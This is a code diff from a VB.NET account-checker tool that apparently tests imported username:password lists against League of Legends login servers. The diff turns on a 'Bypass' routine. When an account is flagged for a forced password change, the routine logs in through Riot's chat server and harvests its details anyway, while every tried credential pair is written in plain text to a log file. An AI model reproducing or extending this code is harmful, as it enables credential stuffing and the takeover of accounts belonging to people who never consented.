@@ -65,16 +65,17 @@ Class MainWindow
     End Sub
     Private Async Sub btn_start_Click(sender As Object, e As RoutedEventArgs) Handles btn_start.Click
         If btn_start.Content = "Start" Then
-            workingaccounts = 0
-            currentthreads = 0
-            checkedaccounts = 0
-            btn_importaccounts.IsEnabled = False
-            btn_start.Content = "Pause"
-            lbl1.Visibility = Windows.Visibility.Visible
-            lbl2.Visibility = Windows.Visibility.Visible
-            lbl3.Visibility = Windows.Visibility.Visible
-            pause = False
+           
             If Not ImportedAccounts.Count <= 0 Then
+                workingaccounts = 0
+                currentthreads = 0
+                checkedaccounts = 0
+                btn_importaccounts.IsEnabled = False
+                btn_start.Content = "Pause"
+                lbl1.Visibility = Windows.Visibility.Visible
+                lbl2.Visibility = Windows.Visibility.Visible
+                lbl3.Visibility = Windows.Visibility.Visible
+                pause = False
                 If chkpw.IsChecked Then dobypass = True
                 timeout = timeoutupdown.Value
                 clientversion = txt_clientversion.Text
@@ -304,22 +305,22 @@ b:
         Return rt
     End Function
 
-    Public Function OnError(ByVal sender As Object, ByVal [error] As PVPNetClient.Error) As Task
-        ' If ([error].Message.Contains("Password Change")) And MainWindow.dobypass Then
-        '  Bypass(acc_.username, acc_.password, regas)
-        '  Else
-        Try
+    Public Async Function OnError(ByVal sender As Object, ByVal [error] As PVPNetClient.Error) As Task
+        If ([error].Message.Contains("Password Change")) And MainWindow.dobypass Then
+            Await Bypass(acc_.username, acc_.password, regiottochat(regas), regiottoserver(regas))
+        Else
+            Try
 b:
-            System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error " & [error].Message & vbNewLine)
-        Catch ex As Exception
-            Thread.Sleep(New Random().Next(100, 200))
-            GoTo b
-        End Try
-
-        '  End If
+                System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error " & [error].Message & vbNewLine)
+            Catch ex As Exception
+                Thread.Sleep(New Random().Next(100, 200))
+                GoTo b
+            End Try
+            MainWindow.currentthreads -= 1
+            MainWindow.checkedaccounts += 1
+        End If
         stp.Stop()
-        MainWindow.currentthreads -= 1
-        MainWindow.checkedaccounts += 1
+
     End Function
     Public Async Function OnLogin(ByVal sender As Object, ByVal uusername As String) As Task
         Try
@@ -438,27 +439,25 @@ a:
         End Select
         Return rt
     End Function
-    Async Function Bypass(user As String, pass As String, region As String) As Task
+    Async Function Bypass(user As String, pass As String, region As String, r As String) As Task
         Try
             Dim id As String = Await GetSummonerId(user, pass, region)
-            MsgBox(id)
-            getinfo(id, user, pass, region)
+            Await getinfo(id, user, pass, r)
         Catch ex As Exception
-            MsgBox(ex.Message)
-            MsgBox(ex.StackTrace)
             Try
-
-            Catch exxx As Exception
+b:
+                System.IO.File.AppendAllText(MainWindow.homefolder & "\log.txt", acc_.username & ":" & acc_.password & " Error While Bypassing PWChange (" & ex.Message & ")" & vbNewLine)
+            Catch
+                Thread.Sleep(New Random().Next(100, 200))
+                GoTo b
             End Try
         End Try
-        ' MainWindow.checkedaccounts += 1
-        'MainWindow.currentthreads -= 1
+        MainWindow.checkedaccounts += 1
+        MainWindow.currentthreads -= 1
     End Function
     Public Function GetSummonerId(user As String, pass As String, region As String) As Task(Of String)
         Dim tsc As TaskCompletionSource(Of String) = New TaskCompletionSource(Of String)()
         Dim xmpp As XmppClientConnection = New XmppClientConnection(String.Format("chat.{0}.lol.riotgames.com", region), 5223) With {.UseSSL = True, .Resource = "xiff", .AutoRoster = False, .AutoPresence = False}
-        ' xmpp.SocketConnect("67.149.54.140", "17374")
-
         xmpp.Open(user, "AIR_" + pass)
         xmpp.Server = "pvp.net"
 
@@ -541,7 +540,7 @@ a:
                 End Try
                 Account.SummonerID = (sid)
                 Account.LastLogin = (UnixTimeStampToDateTime(lastlogin).ToLocalTime)
-                ' MsgBox(Account.Level)
+                Account.Email = "PWBypassed"
                 Try
 z:
                     System.IO.File.WriteAllText(MainWindow.homefolder & "\byacc_" & Account.SummonerID, New Web.Script.Serialization.JavaScriptSerializer().Serialize(Account))
